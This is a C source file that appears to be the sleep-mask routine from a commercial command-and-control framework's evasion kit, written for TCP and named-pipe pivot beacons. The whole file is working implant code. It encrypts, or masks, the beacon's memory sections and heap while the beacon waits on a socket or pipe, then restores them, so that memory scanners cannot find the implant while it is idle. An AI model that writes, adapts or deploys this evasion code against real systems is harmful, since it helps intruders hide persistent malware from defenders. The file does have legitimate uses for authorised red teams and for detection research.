#include <windows.h>
#include "beacon.h"
#include "bofdefs.h"
#include "sleepmask.h"

/******** DO NOT MODIFY FILE START  ********/

#define ACTION_TCP_RECV    0
#define ACTION_TCP_ACCEPT  1
#define ACTION_PIPE_WAIT   2
#define ACTION_PIPE_PEEK   3

typedef struct {
   int    action;
   SOCKET in;
   SOCKET out;
   HANDLE pipe;

   /* ACTION_TCP functions */
   SOCKET(__stdcall *accept)(SOCKET, struct sockaddr *, int *);
   void(__stdcall *recv)(SOCKET, void *, int, int);

   /* ACTION_PIPE functions */
   BOOL(__stdcall *ConnectNamedPipe)(HANDLE, LPOVERLAPPED);
   DWORD(__stdcall *GetLastError)(void);
   BOOL(__stdcall *PeekNamedPipe)(HANDLE, LPVOID, DWORD, LPDWORD, LPDWORD, LPDWORD);
   void(__stdcall *Sleep)(DWORD);
} SLEEPMASK_ARGS;

/******** DO NOT MODIFY FILE END  ********/

#include "common_mask.c"

/* do not change the sleep_mask function parameters */
void sleep_mask(SLEEPMASKP * parms, SLEEPMASK_ARGS * args) {

   /* Mask the beacons sections and heap memory */
   mask_sections(parms);
   mask_heap(parms);

   /* Based on the action wait for data to be available */
   if (args->action == ACTION_TCP_ACCEPT) {
      /* accept a socket */
      args->out = args->accept(args->in, NULL, NULL);
   }
   else if (args->action == ACTION_TCP_RECV) {
      /* block until data is available */
      args->recv(args->in, &(args->out), 1, MSG_PEEK);
   }
   else if (args->action == ACTION_PIPE_WAIT) {
      BOOL fConnected = 0;

      /* wait for a connection to our pipe */
      while (!fConnected) {
         fConnected = args->ConnectNamedPipe(args->pipe, NULL) ? TRUE : (args->GetLastError() == ERROR_PIPE_CONNECTED);
      }
   }
   else if (args->action == ACTION_PIPE_PEEK) {
      DWORD avail;

      /* wait for data to be available on our pipe. */
      while (TRUE) {
         if (!args->PeekNamedPipe(args->pipe, NULL, 0, NULL, &avail, NULL))
            break;

         if (avail > 0)
            break;

         WaitForSingleObject(GetCurrentProcess(), 10);
      }
   }

   /* Call the masking functions again in reverse order to unmask the heap and sections */
   mask_heap(parms);
   mask_sections(parms);

}

